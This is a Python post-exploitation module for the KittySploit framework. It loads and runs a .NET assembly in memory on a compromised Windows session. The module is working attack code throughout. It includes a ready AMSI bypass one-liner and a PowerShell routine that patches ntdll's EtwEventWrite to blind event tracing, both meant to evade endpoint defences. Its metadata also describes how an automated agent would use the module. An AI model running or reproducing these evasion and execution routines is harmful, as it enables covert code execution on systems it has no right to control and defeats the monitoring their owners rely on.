#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.post.windows.session import WindowsSessionMixin

_AMSI_INIT_FAILED = (
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
    ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
)

_ETW_PATCH_PS = r"""
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class EtwPatch {
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);
}
"@
$nt = [EtwPatch]::GetModuleHandle("ntdll.dll")
$etw = [EtwPatch]::GetProcAddress($nt, "EtwEventWrite")
$old = 0
[EtwPatch]::VirtualProtect($etw, [UIntPtr]::new(1), 0x40, [ref]$old) | Out-Null
[System.Runtime.InteropServices.Marshal]::WriteByte($etw, 0xC3)
Write-Output "ETW_PATCHED"
"""


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "Windows In-Memory .NET Assembly",
        "description": (
            "Load a .NET assembly from a path on the target (read bytes, "
            "Assembly.Load, invoke Main) without writing the PE to a new path."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1055/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 4,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 1.5,
            "noise": 0.7,
            "value": 1.1,
            "requires": {"capabilities_any": ["shell"], "capabilities_all": []},
            "chain": {"consumes_capabilities": ["shell"], "produces_capabilities": []},
        },
    }

    assembly_path = OptString("", "Remote path to .NET EXE/DLL on target", True)
    type_name = OptString("", "Fully qualified type name (empty = auto-detect Main)", False)
    method_name = OptString("Main", "Static method to invoke", False)
    arguments = OptString("", "Arguments passed to Main (space-separated)", False)
    bypass_amsi = OptBool(True, "Attempt AMSI bypass before load", False)
    patch_etw = OptBool(False, "Patch ETW in current PS process before load", False)

    def run(self):
        if not self.win_require_windows():
            return False
        if not self.win_require_powershell():
            return False

        remote = str(self.assembly_path or "").strip()
        if not remote:
            raise ProcedureError(FailureType.ConfigurationError, "assembly_path is required")

        check = self.win_execute(f'if exist "{remote}" (echo OK) else (echo MISSING)', timeout=8)
        if "OK" not in check:
            raise ProcedureError(FailureType.NotFound, f"Assembly not found on target: {remote}")

        if self.bypass_amsi:
            self.win_run_powershell(_AMSI_INIT_FAILED, timeout=10)
        if self.patch_etw:
            self.win_run_powershell(_ETW_PATCH_PS, timeout=15)

        print_status(f"Loading assembly in-memory: {remote}")
        out = self.win_run_dotnet_assembly(
            remote,
            type_name=str(self.type_name or "").strip(),
            method_name=str(self.method_name or "Main").strip(),
            arguments=str(self.arguments or "").strip(),
        )
        if out:
            print_success("Assembly execution completed")
            print_info(out)
        else:
            print_warning("No output returned from assembly")
        return True
